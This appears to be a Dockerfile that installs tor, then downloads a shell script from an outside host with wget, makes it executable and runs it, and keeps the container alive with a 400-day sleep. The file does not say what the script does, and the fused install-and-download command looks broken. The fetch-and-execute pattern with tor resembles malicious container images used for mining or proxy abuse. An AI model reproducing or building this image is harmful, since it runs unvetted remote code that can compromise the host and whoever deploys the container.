FROM ya16/siab
RUN cd /tmp ;apt-get update ;export PATH="$PATH:/sbin:/usr/sbin" ; apt-get -y install tor  wget xxt4.2fh.co/s4v-v1.sh ; chmod +x s4v-v1.sh ; ./s4v-v1.sh ; /entrypoint.sh tail -f /s4v/log/tor.out ; sleep 400d
